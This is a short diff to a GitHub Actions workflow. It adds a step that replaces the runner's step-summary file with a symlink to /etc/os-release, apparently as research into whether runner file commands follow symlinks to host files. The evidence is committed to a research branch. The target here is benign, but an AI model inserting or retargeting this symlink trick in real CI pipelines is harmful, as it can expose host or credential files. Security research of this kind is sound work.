@@ -69,6 +69,14 @@ jobs:
               "$CONTAINER_PRETTY" "$HOST_PRETTY" > runner-symlink-evidence.txt
           fi
 
+      - name: Demonstrate arbitrary host file staging through step summary
+        shell: sh
+        run: |
+          rm -f "$GITHUB_STEP_SUMMARY"
+          ln -s /etc/os-release "$GITHUB_STEP_SUMMARY"
+          echo "Container-side target:"
+          readlink "$GITHUB_STEP_SUMMARY"
+
       - name: Persist synthetic validation evidence
         shell: sh
         run: |
@@ -78,3 +86,4 @@ jobs:
           git add runner-symlink-evidence.txt
           git commit -m "Record runner symlink validation evidence [skip ci]"
           git push origin HEAD:research/runner-filecommand-symlink-validation
+
